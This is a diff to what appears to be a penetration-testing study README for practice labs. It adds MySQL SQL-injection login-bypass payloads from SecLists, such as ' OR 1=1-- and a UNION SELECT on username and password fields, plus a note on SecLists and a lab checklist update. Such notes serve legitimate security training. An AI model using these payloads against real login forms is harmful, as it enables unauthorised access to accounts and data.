@@ -58,6 +58,14 @@ Finding columns with a useful data type
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
 ```
+[MySQL-SQLi-Login-Bypass.fuzzdb](https://github.com/danielmiessler/SecLists/blob/f47d52a4fcbceca53b72c9a3dc63a9f719ab0878/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt)
+```
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+```
 ### Scaning & Enumeration
 
 #### [Nmap](https://nmap.org/)
@@ -160,6 +168,8 @@ A tool to dump a git repository from a website.
 git-dumper http://bullybox.local/.git .
 ```
 
+#### [SecLists](https://github.com/danielmiessler/SecLists/tree/master)
+It's a collection of multiple types of lists used during security assessments, collected in one place.
 
 ## Walkthrough Labs
 
@@ -287,7 +297,7 @@ git-dumper http://bullybox.local/.git .
 - [X] [Bullybox]()
 - [X] [ClamAV]()
 - [ ] [Clue]()
-- [ ] [Cockpit]()
+- [x] [Cockpit]()
 - [X] [Easy] Codo ([writeup](/writeups/Codo.md))
 - [ ] [Crane]()
 - [ ] [Exfiltrated]()
